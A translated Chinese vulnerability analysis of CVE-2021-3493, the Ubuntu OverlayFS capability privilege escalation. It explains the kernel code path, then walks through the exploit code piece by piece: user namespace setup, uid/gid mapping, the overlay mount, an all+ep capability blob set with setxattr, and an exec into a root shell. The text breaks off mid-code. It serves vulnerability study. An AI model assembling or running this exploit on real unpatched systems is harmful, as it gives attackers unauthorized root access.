# CVE-2021-3493 Ubuntu内核OverlayFS权限逃逸漏洞分析
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前置知识
###  Overlay文件系统
`Overlayfs`是一种堆叠文件系统，它依赖并建立在其它的文件系统之上（例如`ext4fs`和`xfs`等等），并不直接参与磁盘空间结构的划分，仅仅将原来底层文件系统中不同的目录进行“合并”，然后向用户呈现。因此对于用户来说，它所见到的`overlay`文件系统根目录下的内容就来自挂载时所指定的不同目录的“合集”。如下图所示
其挂载文件的基本命令如下：
    mount -t overlay overlay -o lowerdir=lower1:lower2:lower3,upperdir=upper,workdir=work merged。
其中`lower1:lower2:lower3`表示不同的lower层目录，不同的目录使用`:`分隔，层次关系依次为`lower1 > lower2 >
lower3`
  * upper层是目录和文件系统挂载后用于存放临时和间接文件的工作基目录（work base dir）
  * merged目录就是最终的挂载点目录
正常执行以上命令后，`overlayfs`就成功挂载到`merged`目录下了。
###  Linux Namespace
`User namespace`是`Linux 3.8`新增的一种`namespace`，用于隔离安全相关的资源，包括`user IDs and group
IDs，keys, capabilities`。一个用户可以在一个`user namespace`中是普通用户，但在另一个`user
namespace`中是超级用户。
`User namespace`可以嵌套(目前内核控制最多32层)，除了系统默认的`user namespace`外，所有的`user
namespace`都有一个父`user namespace`，每个 `user namespace`都可以有零到多个子`user
namespace`。当在一个进程中调用 `unshare`或者`clone`创建新的`user namespace`时，当前进程原来所在的 `user
namespace`为父`user namespace`，新的`user namespace 为子 user namespace`。
###  Capabilitiy提权
`Capabilities`机制是在`Linux
2.2`之后引入的，原理很简单，就是将之前与超级用户`root（UID=0`关联的特权细分为不同的功能组，`Capabilites`作为线程（Linux并不真正区分进程和线程）的属性存在，每个功能组都可以独立启用和禁用。其本质上就是将内核调用分门别类，具有相似功能的内核调用被分到同一组中。
每个进程都有五个·`capability`集合：`Permitted，Inheritable，Effective，Ambient，Bounding`。文件的`capability`保存在文件的扩展属性`security.capability`中。文件有三个`capabilitiy`集合：`Permitted，Inheritable，Effective`。文件的`capability`和进程的`capability`一起来决定在执行`execve`后，进程的`capability`。
在执行特权操作时，如果线程的有效身份不是`root`，就去检查其是否具有该特权操作所对应的`capabilities`，并以此为依据，决定是否可以执行特权操作。比如`ping`程序需要打开套接字，但是需要`root`权限才能打开套接字，此时就可通过设置`capabilities`来让普通用户使用`ping`
如果一个程序具有较高的`capabilities`且存在漏洞，那么攻击者就可以利用这个程序进行提权。
## 漏洞分析
实验环境：`Linux ubuntu 5.8.0-48-generic #54~20.04.1-Ubuntu SMP Sat Mar 20 13:40:25
UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`
5.8版本内核主线代码，`ovl_fs_type`结构体定义如下
    //https://github.com/torvalds/linux/blob/bcf876870b95592b52519ed4aafcf9d95999bc9c/fs/overlayfs/super.c#L1947
    static struct file_system_type ovl_fs_type = {
        .owner        = THIS_MODULE,
        .name        = "overlay",
        .mount        = ovl_mount,
        .kill_sb    = kill_anon_super,
    };
    MODULE_ALIAS_FS("overlay");
`Ubuntu
20.04`对该结构体进行了修改，添加了`fs_flags`数据域，并设置为`FS_USERNS_MOUNT`，表示将允许一个普通用户在低权限用户命名空间中`mount`一个`overlayfs`文件系统
    #https://launchpadlibrarian.net/528725861/linux_5.8.0-48.54.diff.gz
    @@ -1949,6 +1964,7 @@
         .name        = "overlay",
         .mount        = ovl_mount,
         .kill_sb    = kill_anon_super,
    +    .fs_flags    = FS_USERNS_MOUNT,
     };
     MODULE_ALIAS_FS("overlay");
mount时会进入`mount_capable`函数，此时`fs->flags = FS_USERNS_MOUNT`进入`ns_capable`
    bool mount_capable(struct fs_context *fc)
    {
        if (!(fc->fs_type->fs_flags & FS_USERNS_MOUNT))
            return capable(CAP_SYS_ADMIN);
        else
            return ns_capable(fc->user_ns, CAP_SYS_ADMIN);
    }
调用链如下
进入`ns_capable_common`时
    static bool ns_capable_common(struct user_namespace *ns,
                      int cap,
                      unsigned int opts)
    {
    ...
        capable = security_capable(current_cred(), ns, cap, opts);
        if (capable == 0) {
            current->flags |= PF_SUPERPRIV;//这里设置了current->flags为PF_SUPERPRIV，即在当前进程上设置超级权限，并返回ture。所以通过挂载overlay文件系统，当前进程具备了超级权限。
            return true;
        }
        return false;
    }
当对`setxattr()`文件扩展属性的`capabilitiy`进行设置时，权限校验不彻底，进入`cap_convert_nscap()`函数时，
    int cap_convert_nscap(struct dentry *dentry, void **ivalue, size_t size)
    {
    ...
        if (size == XATTR_CAPS_SZ_2)
            if (ns_capable(inode->i_sb->s_user_ns, CAP_SETFCAP))
                /* user is privileged, just write the v2 */
                return size;
    }
如果是`capabilitiy`版本2，则直接调用`ns_capable()`进行检验，根据注释可知，如果`user`有超级权限，则直接写入并返回。
因为当前访问的`inode`属于`overlay`文件系统。从`cap_convert_nscap(`)函数正确返回后，随即进入`vfs_setxattr()`函数，接下来分发到`overlay`文件系统对应的`ovl_xattr_set()`函数中
    int ovl_xattr_set(struct dentry *dentry, struct inode *inode, const char *name,
              const void *value, size_t size, int flags)
    {
        int err;
        struct dentry *upperdentry = ovl_i_dentry_upper(inode);
        struct dentry *realdentry = upperdentry ?: ovl_dentry_lower(dentry);
        const struct cred *old_cred;
        ...
    }
其中的`upperdentry`和`realdentry`就是`./eki_ovlcap/upper`目录下的`magic`的目录项
也就是说在给`overlay`文件系统中的`./eki_ovlcap/merge/magic`设置`capabilitiy`时就是对ext3文件系统下的`./eki_ovlcap/upper/magic`进行设置`capabilitiy`从而实现了权限逃逸
## 漏洞演示
下面具体来看Exp的分析
首先fork子进程在子进程中调用exploit
    int main(int argc, char *argv[])
    {
        pid_t child = fork();
        if (child == -1)
            err(1, "fork");
        if (child == 0) {
            _exit(exploit());
        } else {
            waitpid(child, NULL, 0);
        }
        execl(BIN_UPPER, BIN_UPPER, "shell", NULL);
        err(1, "execl %s", BIN_UPPER);
    }
下面分析`exploit`函数，首先是建立相关文件夹
    #define DIR_BASE    "./eki_ovlcap"
    #define DIR_WORK    DIR_BASE "/work"
    #define DIR_LOWER   DIR_BASE "/lower"
    #define DIR_UPPER   DIR_BASE "/upper"
    #define DIR_MERGE   DIR_BASE "/merge"
    static int exploit()
    {
        mkdir(DIR_BASE, 0777);
        mkdir(DIR_WORK,  0777);
        mkdir(DIR_LOWER, 0777);
        mkdir(DIR_UPPER, 0777);
        mkdir(DIR_MERGE, 0777);
        return 0;
    }
因为`overlayfs mount`需要`CAP_SYS_MOUNT`，通过`unshare`函数创建新的`user namespace`
使用flag为`CLONE_NEWNS | CLONE_NEWUSER`
        if (unshare(CLONE_NEWNS | CLONE_NEWUSER) == -1)
            err(1, "unshare");
然后获取`uid`和`gid`,并修改相应文件进行映射
        writefile("/proc/self/setgroups", "deny");
        uid_t uid = getuid();
        gid_t gid = getgid();
        sprintf(buf, "0 %d 1", uid);
        writefile("/proc/self/uid_map", buf);
        sprintf(buf, "0 %d 1", gid);
        writefile("/proc/self/gid_map", buf);
这步是必须的,如下所示
    $ id
    uid=1000(eki) gid=1001(eki) groups=1001(eki)
    $ unshare --user /bin/bash
    nobody@EDI:/root$ id
    uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
在新的`user namespace`中，当前用户变成了`nobody`  
我们还需要映射父`user namespace`的`user ID`和`group ID`到子`user
namespace`中来，这一步是必须的，因为这样系统才能控制一个`user namespace`里的用户在其他`user namespace`中的权限。
映射`ID`的方法就是添加映射信息到`/proc/PID/uid_map`和 `/proc/PID/gid_map`(这里的 PID 是新 user
namespace 中的进程 ID，刚开始时这两个文件都是空的)文件中。
文件配置信息的格式如下：
    ID-inside-ns ID-outside-ns length
在这里就是
        sprintf(buf, "0 %d 1", uid);
        writefile("/proc/self/uid_map", buf);
        sprintf(buf, "0 %d 1", gid);
        writefile("/proc/self/gid_map", buf);
其中`writefile`函数就是向对应file中写入第二个参数中的字符串，实现后面完整代码
然后挂载overlay文件系统，根据之前的分析，在`Ubuntu`中用户是有权限挂载的
    #define BIN_MERGE   DIR_MERGE "/magic"
        sprintf(buf, "lowerdir=%s,upperdir=%s,workdir=%s", DIR_LOWER, DIR_UPPER, DIR_WORK);
        if (mount("overlay", DIR_MERGE, "overlay", 0, buf) == -1)
            err(1, "mount %s", DIR_MERGE);
        copyfile("/proc/self/exe", BIN_MERGE, 0777);
其中`copyfile`函数就是将文件复制到第二个参数中，并赋予第三个参数的权限，实现见后面的完整代码
这里是将`/proc/self/exe`复制到`BIN_MERGE`也就是`./eki_ovlcap/merge/magic`下
接着构造一个`capabilities`
        // all+ep
        char cap[] = "\x01\x00\x00\x02\xff\xff\xff\xff\x00\x00\x00\x00\xff\xff\xff\xff\x00\x00\x00\x00";
`cap`中
    \x01\x00\x00\x02 #对应megic_etc
    \xff\xff\xff\xff #对应permiited
    \x00\x00\x00\x00 #对应inheritable
    \xff\xff\xff\xff
    \x00\x00\x00\x00
效果如下
权限逃逸关键在于`setxattr`
        if (setxattr(BIN_MERGE, "security.capability", cap, sizeof(cap) - 1, 0) == -1)
            err(1, "setxattr %s", BIN_MERGE);
根据前文漏洞原理介绍，执行完此函数后，属于`ext3`文件系统的`./eki_ovlcap/upper/magic`文件的`capabilitiy`为`all+ep`,这个程序就是我们之前`copyfile`过去的程序。
    #define BIN_UPPER   DIR_UPPER "/magic"
        pid_t child = fork();
        if (child == 0) {